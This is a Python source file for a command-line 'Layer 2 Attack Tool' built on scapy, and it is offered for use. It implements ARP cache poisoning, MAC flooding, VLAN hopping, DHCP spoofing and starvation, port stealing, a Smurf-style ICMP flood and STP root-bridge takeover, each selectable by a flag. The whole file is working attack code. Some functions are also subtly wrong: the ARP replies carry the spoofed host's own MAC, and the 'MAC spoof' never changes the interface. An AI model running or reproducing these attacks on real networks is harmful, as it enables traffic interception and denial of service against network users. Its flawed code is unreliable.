import scapy.all as scapy
import random
import argparse
import threading
import time
import pyfiglet
from termcolor import colored

def banner():
    """Displays the tool banner."""
    text = pyfiglet.figlet_format("BIG BOSS", font="slant")
    colored_text = colored(text, "red")
    print(colored_text)
    print("""
    ╔══════════════════════════════════╗
    ║          LayerBreaker             ║
    ║    Layer 2 Attack Tool            ║
    ╚══════════════════════════════════╝
    """)
def get_mac(ip):
    """Retrieves the MAC address corresponding to an IP address using ARP requests."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    return None

def send_arp_packet(target_ip, spoof_ip, target_mac):
    """Sends an ARP reply packet to trick the target into associating the attacker's MAC with the spoofed IP."""
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=get_mac(spoof_ip))
    scapy.sendp(packet, verbose=False)

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restores the original ARP tables by sending correct ARP replies."""
    packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.sendp(packet1, count=4, verbose=False)
    scapy.sendp(packet2, count=4, verbose=False)

def arp_spoof(target_ip, gateway_ip):
    """Performs ARP Spoofing attack by poisoning the ARP cache."""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[!] Could not find MAC addresses. Exiting...")
        return
    try:
        print(f"[+] Spoofing {target_ip} and {gateway_ip}")
        while True:
            send_arp_packet(target_ip, gateway_ip, target_mac)
            send_arp_packet(gateway_ip, target_ip, gateway_mac)
            time.sleep(0.05)  # Fast sending
    except KeyboardInterrupt:
        print("[!] Stopping ARP Spoofing. Restoring network...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)

def mac_flood(target_ip):
    """Floods the switch with fake MAC addresses to cause it to forward packets to all devices."""
    print("[+] Flooding the switch with fake MAC addresses...")
    while True:
        fake_mac = "00:11:22:33:44:{}".format(str(random.randint(0, 255)))
        packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) / scapy.IP(dst=target_ip)
        scapy.sendp(packet, verbose=False)
        time.sleep(0.01)  # Increased speed

def vlan_hopping():
    """Sends VLAN tagged packets to hop between VLANs."""
    vlan_tagged_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.Dot1Q(vlan=100) / scapy.IP(dst="192.168.1.1")
    scapy.sendp(vlan_tagged_packet, verbose=False)

def dhcp_spoof(target_ip, fake_dhcp_server_ip):
    """Creates a fake DHCP server to assign malicious IP configurations."""
    print(f"[+] Spoofing DHCP responses for {target_ip}")
    dhcp_offer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(src=fake_dhcp_server_ip, dst="255.255.255.255") \
                / scapy.UDP(sport=67, dport=68) / scapy.BOOTP(op=2, yiaddr=target_ip, siaddr=fake_dhcp_server_ip) \
                / scapy.DHCP(options=[("message-type", 2), ("server_id", fake_dhcp_server_ip), ("lease_time", 3600), "end"])
    scapy.sendp(dhcp_offer, verbose=False)

def dhcp_starvation(target_ip):
    """Performs a DHCP starvation attack by flooding the network with DHCP requests."""
    print("[+] Starting DHCP Starvation attack...")
    while True:
        dhcp_discover = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(src="0.0.0.0", dst="255.255.255.255") \
                        / scapy.UDP(sport=68, dport=67) / scapy.BOOTP(op=1) / scapy.DHCP(options=[("message-type", 1), "end"])
        scapy.sendp(dhcp_discover, verbose=False)
        time.sleep(0.05)  # Faster requests

def port_stealing(target_mac, port_number):
    """Mimics a device’s MAC address to steal the port of another device."""
    print(f"[+] Stealing port {port_number} with MAC {target_mac}")
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=target_mac) / scapy.IP()
    scapy.sendp(packet, verbose=False)

def mac_spoof(new_mac):
    """Changes the MAC address of the current machine."""
    print(f"[+] Spoofing MAC address to {new_mac}")
    interface = "eth0"  # You can change this to your network interface name
    scapy.conf.iface = interface
    try:
        scapy.sendp(scapy.Ether(src=new_mac, dst="ff:ff:ff:ff:ff:ff") / scapy.IP(), verbose=False)
        print(f"[+] MAC address spoofed to {new_mac}")
    except Exception as e:
        print(f"[!] Error while spoofing MAC address: {e}")

def smurf_attack(target_ip):
    """Performs a Smurf attack by sending a large number of ICMP requests to the target using the network's broadcast address."""
    print(f"[+] Launching Smurf Attack on {target_ip}")
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(dst=target_ip) / scapy.ICMP()
    while True:
        scapy.sendp(broadcast, verbose=False)  # Increased sending speed
        time.sleep(0.05)  # Reduced delay to maximize attack speed
def stp_manipulation():
    """Sends fake STP BPDU packets to become the root bridge."""
    print("[+] Performing STP Manipulation Attack...")
    bpdu_packet = scapy.Ether(dst="01:80:c2:00:00:00") / scapy.LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
                  scapy.STP(rootid=0, bridgeid=0, portid=0, cost=0)
    while True:
        scapy.sendp(bpdu_packet, verbose=False)
        time.sleep(2)

def main():
    """Parses arguments and initiates the attack if requested."""
    banner()
    parser = argparse.ArgumentParser(description="Layer 2 Attack Tool")
    parser.add_argument("--arp-spoof", nargs=2, metavar=("TARGET", "GATEWAY"), help="Perform ARP Spoofing")
    parser.add_argument("--mac-flood", metavar="TARGET", help="Perform MAC Flooding")
    parser.add_argument("--vlan-hop", action="store_true", help="Perform VLAN Hopping")
    parser.add_argument("--dhcp-spoof", nargs=2, metavar=("TARGET", "DHCP_SERVER"), help="Perform DHCP Spoofing")
    parser.add_argument("--dhcp-starvation", metavar="TARGET", help="Perform DHCP Starvation")
    parser.add_argument("--port-steal", nargs=2, metavar=("TARGET_MAC", "PORT"), help="Perform Port Stealing")
    parser.add_argument("--mac-spoof", metavar="NEW_MAC", help="Perform MAC Spoofing")
    parser.add_argument("--smurf", metavar="TARGET", help="Perform Smurf Attack")
    parser.add_argument("--stp-manipulation", action="store_true", help="Perform STP Manipulation Attack")
    args = parser.parse_args()
    
    if args.arp_spoof:
        target, gateway = args.arp_spoof
        arp_spoof(target, gateway)
    if args.mac_flood:
        mac_flood(args.mac_flood)
    if args.vlan_hop:
        vlan_hopping()
    if args.dhcp_spoof:
        target, dhcp_server = args.dhcp_spoof
        dhcp_spoof(target, dhcp_server)
    if args.dhcp_starvation:
        dhcp_starvation(args.dhcp_starvation)
    if args.port_steal:
        target_mac, port = args.port_steal
        port_stealing(target_mac, port)
    if args.mac_spoof:
        new_mac = args.mac_spoof
        mac_spoof(new_mac)
    if args.smurf:
        target = args.smurf
        smurf_attack(target)
    if args.stp_manipulation:
        stp_manipulation()

if __name__ == "__main__":
    main()

